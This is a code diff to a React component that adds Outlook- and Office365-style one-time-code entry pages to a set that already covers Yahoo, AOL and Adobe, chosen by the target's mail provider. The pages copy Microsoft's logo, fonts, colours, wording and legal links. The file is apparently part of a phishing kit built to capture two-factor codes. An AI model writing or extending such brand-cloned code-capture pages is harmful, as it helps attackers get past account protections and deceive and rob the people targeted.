@@ -297,6 +297,159 @@ const AolOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boole
   );
 };
 
+/* ── Microsoft Logo ───────────────────────────────────────────── */
+const MicrosoftLogo = () => (
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 21 21" className="w-5 h-5">
+    <rect x="1" y="1" width="9" height="9" fill="#F25022" />
+    <rect x="11" y="1" width="9" height="9" fill="#7FBA00" />
+    <rect x="1" y="11" width="9" height="9" fill="#00A4EF" />
+    <rect x="11" y="11" width="9" height="9" fill="#FFB900" />
+  </svg>
+);
+
+/* ── Outlook-style OTP ────────────────────────────────────────── */
+const OutlookOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
+  const [resendSent, setResendSent] = useState(false);
+  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
+
+  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
+
+  const handleResend = () => {
+    if (onResend) {
+      onResend();
+      setResendSent(true);
+      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+      <div className="w-full max-w-sm">
+        <div className="bg-white p-8 md:p-10" style={{ boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
+          <div className="mb-6">
+            <MicrosoftLogo />
+          </div>
+
+          {email && (
+            <div className="flex items-center gap-2 mb-4">
+              <svg className="w-5 h-5 text-gray-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
+              <span className="text-sm text-gray-700">{email}</span>
+            </div>
+          )}
+
+          <h1 className="text-2xl font-semibold text-gray-900 mb-2" style={{ fontWeight: 600 }}>Enter code</h1>
+          <p className="text-sm text-gray-600 mb-1">
+            We sent a code to your email
+          </p>
+          {email && <p className="text-sm text-gray-900 font-medium mb-6">{maskEmail(email)}</p>}
+
+          <form onSubmit={onSubmit} className="space-y-4">
+            {errorMessage && (
+              <div className="p-3 text-sm text-red-700 bg-red-50 border-l-4 border-red-500 flex items-start gap-2">
+                <span>{errorMessage}</span>
+              </div>
+            )}
+
+            <div>
+              <label className="text-sm text-gray-700 block mb-1">Code</label>
+              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+            </div>
+
+            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 font-semibold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#0067B8' }}>
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Verify'}
+            </button>
+          </form>
+
+          <div className="mt-4">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm hover:underline disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8' }}>
+              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
+            </button>
+          </div>
+        </div>
+
+        <div className="mt-6 flex items-center justify-center gap-3 text-xs text-gray-500">
+          <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Terms of use</a>
+          <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Privacy & cookies</a>
+          <span className="text-gray-400">···</span>
+        </div>
+      </div>
+    </div>
+  );
+};
+
+/* ── Office365-style OTP ──────────────────────────────────────── */
+const Office365Otp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void; onResend?: () => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit, onResend }) => {
+  const [resendSent, setResendSent] = useState(false);
+  const resendTimerRef = useRef<ReturnType<typeof setTimeout>>();
+
+  useEffect(() => () => { if (resendTimerRef.current) clearTimeout(resendTimerRef.current); }, []);
+
+  const handleResend = () => {
+    if (onResend) {
+      onResend();
+      setResendSent(true);
+      resendTimerRef.current = setTimeout(() => setResendSent(false), 30000);
+    }
+  };
+
+  return (
+    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: '#fff', fontFamily: "'Segoe UI', 'Helvetica Neue', Arial, sans-serif" }}>
+      <div className="w-full max-w-sm">
+        <div className="bg-white p-8 md:p-10" style={{ boxShadow: '0 2px 6px rgba(0,0,0,0.2)' }}>
+          <div className="flex items-center gap-2 mb-6">
+            <MicrosoftLogo />
+            <span className="text-base font-semibold text-gray-900">Microsoft</span>
+          </div>
+
+          {email && (
+            <div className="flex items-center gap-2 mb-4">
+              <svg className="w-5 h-5 text-gray-600 flex-shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" /></svg>
+              <span className="text-sm text-gray-700">{email}</span>
+            </div>
+          )}
+
+          <h1 className="text-2xl font-semibold text-gray-900 mb-2" style={{ fontWeight: 600 }}>Enter code</h1>
+          <p className="text-sm text-gray-600 mb-1">
+            We sent a code to your email
+          </p>
+          {email && <p className="text-sm text-gray-900 font-medium mb-6">{maskEmail(email)}</p>}
+
+          <form onSubmit={onSubmit} className="space-y-4">
+            {errorMessage && (
+              <div className="p-3 text-sm text-red-700 bg-red-50 border-l-4 border-red-500 flex items-start gap-2">
+                <span>{errorMessage}</span>
+              </div>
+            )}
+
+            <div>
+              <label className="text-sm text-gray-700 block mb-1">Code</label>
+              <OtpInput length={6} onComplete={onOtpComplete} disabled={isLoading} theme="light" />
+            </div>
+
+            <button type="submit" disabled={isLoading || otp.length !== 6} className="w-full py-2.5 px-4 font-semibold text-sm text-white disabled:opacity-50 disabled:cursor-not-allowed transition-colors" style={{ backgroundColor: '#0067B8' }}>
+              {isLoading && <Spinner size="sm" color="border-white" className="mr-2" />}
+              {isLoading ? 'Verifying...' : 'Verify'}
+            </button>
+          </form>
+
+          <div className="mt-4">
+            <button type="button" onClick={handleResend} disabled={resendSent} className="text-sm hover:underline disabled:opacity-50 disabled:cursor-not-allowed" style={{ color: '#0067B8' }}>
+              {resendSent ? 'Code resent successfully' : "I didn't get a code"}
+            </button>
+          </div>
+        </div>
+
+        <div className="mt-6 flex items-center justify-center gap-3 text-xs text-gray-500">
+          <a href="https://go.microsoft.com/fwlink/?LinkID=2259814" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Terms of use</a>
+          <a href="https://privacy.microsoft.com/en-us/privacystatement" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700 hover:underline">Privacy & cookies</a>
+          <span className="text-gray-400">···</span>
+        </div>
+      </div>
+    </div>
+  );
+};
+
 /* ── Default / Others / Adobe-style OTP ───────────────────────── */
 const DefaultOtp: React.FC<{ email?: string; errorMessage?: string; isLoading: boolean; otp: string; onOtpComplete: (v: string) => void; onSubmit: (e: React.FormEvent) => void }> = ({ email, errorMessage, isLoading, otp, onOtpComplete, onSubmit }) => (
   <div className="min-h-screen flex items-center justify-center p-4 font-sans" style={{ background: 'linear-gradient(135deg, #1B1B1B 0%, #2C2C2C 50%, #1B1B1B 100%)', fontFamily: "'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif" }}>
@@ -379,6 +532,10 @@ const OtpPage: React.FC<OtpPageProps> = ({ onSubmit, isLoading, errorMessage, em
       return <YahooOtp {...sharedProps} onResend={onResend} />;
     case 'AOL':
       return <AolOtp {...sharedProps} onResend={onResend} />;
+    case 'Outlook':
+      return <OutlookOtp {...sharedProps} onResend={onResend} />;
+    case 'Office365':
+      return <Office365Otp {...sharedProps} onResend={onResend} />;
     default:
       return <DefaultOtp {...sharedProps} />;
   }
